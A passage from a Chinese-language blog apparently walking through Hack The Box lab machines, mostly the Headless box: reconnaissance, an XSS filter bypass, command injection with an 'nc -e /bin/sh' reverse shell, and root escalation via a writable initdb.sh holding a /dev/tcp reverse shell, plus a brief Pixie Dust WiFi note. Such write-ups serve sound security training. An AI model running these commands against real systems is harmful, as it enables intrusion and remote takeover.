<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt; ps -aux</span><br><span class="line">USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root           1  0.0  0.2  17996 10508 ?        Ss   Mar23   0:01 /sbin/init</span><br><span class="line">root         125  0.0  0.5  55904 20732 ?        S&lt;s  Mar23   0:02 /lib/systemd/systemd-journald</span><br><span class="line">systemd+     152  0.0  0.2  16112  8120 ?        Ss   Mar23   0:00 /lib/systemd/systemd-networkd</span><br><span class="line">systemd+     155  0.0  0.3  25524 12628 ?        Ss   Mar23   0:00 /lib/systemd/systemd-resolved</span><br><span class="line">root         160  0.0  0.0   9484  2860 ?        Ss   Mar23   0:00 /usr/sbin/cron -f -P</span><br><span class="line">message+     161  0.0  0.1   8540  4700 ?        Ss   Mar23   0:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only</span><br><span class="line">root         163  0.0  0.4  34288 18704 ?        Ss   Mar23   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers</span><br><span class="line">syslog       164  0.0  0.1 222392  4904 ?        Ssl  Mar23   0:00 /usr/sbin/rsyslogd -n -iNONE</span><br><span class="line">root         165  0.0  0.1  14896  6312 ?        Ss   Mar23   0:00 /lib/systemd/systemd-logind</span><br><span class="line">root         166  0.0  0.1  16488  5708 ?        Ss   Mar23   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant</span><br><span class="line">root         171  0.0  0.0   9960  3512 ?        Ss   Mar23   0:00 /bin/bash /opt/PLC/OpenPLC_v3/start_openplc.sh</span><br><span class="line">root         173  0.0  0.8 466676 33016 ?        Sl   Mar23   0:22 python2.7 webserver.py</span><br><span class="line">root         174  0.0  0.0   8388  1096 pts/0    Ss+  Mar23   0:00 /sbin/agetty -o -p -- \\u --noclear --keep-baud console 115200,38400,9600 vt220</span><br><span class="line">root        2921  0.0  0.0   9960  3572 ?        S    08:51   0:00 bash</span><br><span class="line">root        2925  0.0  0.0  12924  3700 ?        R    08:53   0:00 ps -aux</span><br></pre></td></tr></table></figure>

<p>搜了一下是无线安全打 WiFi 的(Pixie Dust attack)，可以直接用 <a target="_blank" rel="noopener" href="https://github.com/nikita-yfh/OneShot-C">oneshot</a>  进行Pixie Dust attack，获得 WIFI 的 WPA PSK 。然后<a target="_blank" rel="noopener" href="https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant">连接 WIFI</a> 最后<code>ssh root@wifi的ip</code></p>
<p>根本不懂呜呜，，</p>
</li>
</ol>
</li>
</ol>
<h2 id="Headless-EASY"><a href="#Headless-EASY" class="headerlink" title="Headless_EASY"></a>Headless_EASY</h2><h3 id="题目来源-1"><a href="#题目来源-1" class="headerlink" title="题目来源"></a>题目来源</h3><p><a target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/594">Hack The Box - Season 4 - Headless</a></p>
<p>EASY</p>
<h3 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h3><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><ol>
<li><p>先 nmap</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sV -Pn 10.129.217.40</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.217.40</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span><br><span class="line">5000/tcp open  upnp?</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p><strong><code>upnp-evnt</code></strong> 看看怎么个事儿</p>
<blockquote>
<p>UPnP（通用即插即用）服务是一种基于UPnP协议，用于实现设备之间互相发现和交谈的服务。UPnP服务通常可以包括多种类型的服务，例如媒体服务器服务、打印机服务、网络存储服务等等。</p>
<p>UPnP服务通常在设备之间使用HTTP协议进行通信，设备可以通过HTTP请求（如HTTP GET、POST等）来查询其他设备的服务，并且根据查询结果来做出相应的操作。因此，UPnP服务也称为互联网设备联盟设备控制协议（UPnP Device Control Protocol）。</p>
<p>在UPnP服务架构中，设备通常包含一个设备描述文档（Device Description Document），它定义了设备的基本信息、属性、状态、可用服务等。设备描述文档基于XML格式编写，由设备厂商提供。</p>
<p>需要注意的是，UPnP服务的开放性和易用性也带来了安全风险。未经适当保护的UPnP服务可能会被黑客利用，从而导致网络受到攻击。为了减轻这种风险，DOWNUPnP Forum和其他组织已经制定了一些UPnP安全模型和UPnP安全指南，旨在帮助设备生产厂商和用户加强对UPnP服务的管控和保护。</p>
</blockquote>
</li>
<li><p>访问 5000</p>
<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240325000330795.png" alt="image-20240325000330795" style="zoom:25%;" />
</li>
<li><p>抓个包看看</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;http://10.129.217.40:5000/support&gt;</span><br><span class="line">Host: 10.129.217.40:5000</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 61</span><br><span class="line">Origin: &lt;http://10.129.217.40:5000&gt;</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: &lt;http://10.129.217.40:5000/support&gt;</span><br><span class="line">Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">fname=1&amp;lname=1&amp;email=11@11.com&amp;phone=13333333333&amp;message=1</span><br><span class="line"></span><br><span class="line">POST: HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/2.2.2 Python/3.11.2</span><br><span class="line">Date: Sun, 24 Mar 2024 13:28:23 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 2363</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<ol>
<li><p>首先有一个  <code>is_admin</code> 的 cookie ，base64_decode 出来前半部分为 user，说明需要越权到admin。</p>
</li>
<li><p>message 处富文本随便试一下 <code>xss</code> 被告警，说明有过滤，所以考点是 <code>XSS bypass</code></p>
</li>
<li><p>URL 编码绕过 <code>&lt; &gt;</code> 就可以。这里内网环境需要内网搭建 XSS platform。好麻烦，直接抄了，假装打过hhh</p>
</li>
<li><p>fuzz 一下发现： <code>/</code>   <code>/dashboard</code>   <code>/suport</code> 三个目录</p>
</li>
<li><p>然后访问 <code>/dashboard</code> 在 <code>date=2023-09-15</code>  处有回显，分号拼接进行命令注入。getflag</p>
<p>有一个小坑。使用 bash 弹不回来。不知道是不是因为 <code>$SHELL=/bin/zsh</code></p>
<p>改用 nc 弹</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># psych @ VM-8-4-debian in /root [22:37:19] </span></span><br><span class="line">$ curl -X POST \\</span><br><span class="line">&lt;http://10.129.217.40:5000/dashboard&gt; \\</span><br><span class="line">-H <span class="string">&#x27;Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0&#x27;</span> \\</span><br><span class="line">--data <span class="string">&quot;date=2023-09-15;nc -e /bin/sh 10.10.14.51 50001&quot;</span>  </span><br></pre></td></tr></table></figure>

<ol>
<li><p>进去之后是dvir的权限，下一步是提权到 root</p>
<ul>
<li><code>/etc/passwd</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">···</span><br><span class="line">colord:x:110:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">dvir:x:1000:1000:dvir,,,:/home/dvir:/bin/bash</span><br><span class="line">sshd:x:111:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">_laurel:x:999:994::/var/log/laurel:/bin/false</span><br></pre></td></tr></table></figure>

<ul>
<li><code>sudo</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> dvir on headless:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User dvir may run the following commands on headless:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/syscheck</span><br></pre></td></tr></table></figure>

<ul>
<li><p>其中的 <code>syscheck</code> 相当于SUID，可以进行提权嘛</p>
<p>先 cat 一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">cat</span> /usr/bin/syscheck</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">last_modified_time=$(/usr/bin/find /boot -name <span class="string">&#x27;vmlinuz*&#x27;</span> -<span class="built_in">exec</span> <span class="built_in">stat</span> -c %Y &#123;&#125; + | /usr/bin/sort -n | /usr/bin/tail -n 1)</span><br><span class="line">formatted_time=$(/usr/bin/date -d <span class="string">&quot;@<span class="variable">$last_modified_time</span>&quot;</span> +<span class="string">&quot;%d/%m/%Y %H:%M&quot;</span>)</span><br><span class="line">/usr/bin/echo <span class="string">&quot;Last Kernel Modification Time: <span class="variable">$formatted_time</span>&quot;</span></span><br><span class="line"></span><br><span class="line">disk_space=$(/usr/bin/df -h / | /usr/bin/awk <span class="string">&#x27;NR==2 &#123;print $4&#125;&#x27;</span>)</span><br><span class="line">/usr/bin/echo <span class="string">&quot;Available disk space: <span class="variable">$disk_space</span>&quot;</span></span><br><span class="line"></span><br><span class="line">load_average=$(/usr/bin/uptime | /usr/bin/awk -F<span class="string">&#x27;load average:&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">/usr/bin/echo <span class="string">&quot;System load average: <span class="variable">$load_average</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! /usr/bin/pgrep -x <span class="string">&quot;initdb.sh&quot;</span> &amp;&gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">  /usr/bin/echo <span class="string">&quot;Database service is not running. Starting it...&quot;</span></span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  /usr/bin/echo <span class="string">&quot;Database service is running.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
</li>
<li><p>里面涉及检查 <code>initdb.sh</code> 的进程，如果没有，就运行  <code>./initdb.sh 2&gt;/dev/null</code></p>
</li>
<li><p>所以直接创建一个 <code>./initdb.sh</code> 然后写进去：<code>/bin/bash</code> 并 <code>chmod x</code> 权限</p>
</li>
<li><p>然后 <code>sudo</code> 执行 <code>syscheck</code> ，就会 <code>sudo</code> 执行 <code>initdb.sh</code></p>
</li>
<li><p>我们直接在 <a target="_blank" rel="noopener" href="http://initdb.sh/">initdb.sh</a> 里面写反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">echo</span> <span class="string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.51/50003 0&gt;&amp;1&quot;</span> &gt; initdb.sh</span><br><span class="line">&gt; <span class="built_in">chmod</span> +x ./initdb.sh</span><br><span class="line">&gt; sudo /usr/bin/syscheck</span><br><span class="line">sudo /usr/bin/syscheck</span><br><span class="line">Last Kernel Modification Time: 01/02/2024 10:05</span><br><span class="line">Available disk space: 2.0G</span><br><span class="line">System load average:  0.00, 0.00, 0.00</span><br><span class="line">Database service is not running. Starting it...</span><br></pre></td></tr></table></figure>
</li>
<li><p>弹回来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ VM-8-4-debian in ~ [23:43:39] </span></span><br><span class="line">$ nc -lvvp 50003</span><br><span class="line">listening on [any] 50003 ...</span><br><span class="line">10.129.217.40: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.14.51] from (UNKNOWN) [10.129.217.40] 33598</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1157): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@headless:/home/dvir/app<span class="comment"># cat /root/root.txt</span></span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br><span class="line">3db7268a07f2c4f37ae88500878b7590</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Article</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WifineticTwo-MID"><span class="toc-number">1.</span> <span class="toc-text">WifineticTwo_MID</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90"><span class="toc-number">1.1.</span> <span class="toc-text">题目来源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Headless-EASY"><span class="toc-number">2.</span> <span class="toc-text">Headless_EASY</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90-1"><span class="toc-number">2.1.</span> <span class="toc-text">题目来源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9-1"><span class="toc-number">2.2.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">2.3.</span> <span class="toc-text">分析</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&text=HTB打靶月计_2403"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&title=HTB打靶月计_2403"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&is_video=false&description=HTB打靶月计_2403"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HTB打靶月计_2403&body=Check out this article: http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&title=HTB打靶月计_2403"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&title=HTB打靶月计_2403"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&title=HTB打靶月计_2403"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&title=HTB打靶月计_2403"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&name=HTB打靶月计_2403&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&t=HTB打靶月计_2403"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022-2024
    psych
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Article</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
    </ul>
    <ul>
      
        <!-- 不蒜子统计 -->
        <span id="busuanzi_container_site_pv">
            本站总访问量<span id="busuanzi_value_site_pv"></span>次
        </span>
        <span class="post-meta-divider">|</span>
        <span id="busuanzi_container_site_uv" style='display:none'>
                本站访客数<span id="busuanzi_value_site_uv"></span>人
        </span>
      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
      
    </ul>
  </nav>
</div>

</footer>
    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'p5ych2022/psych.green';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
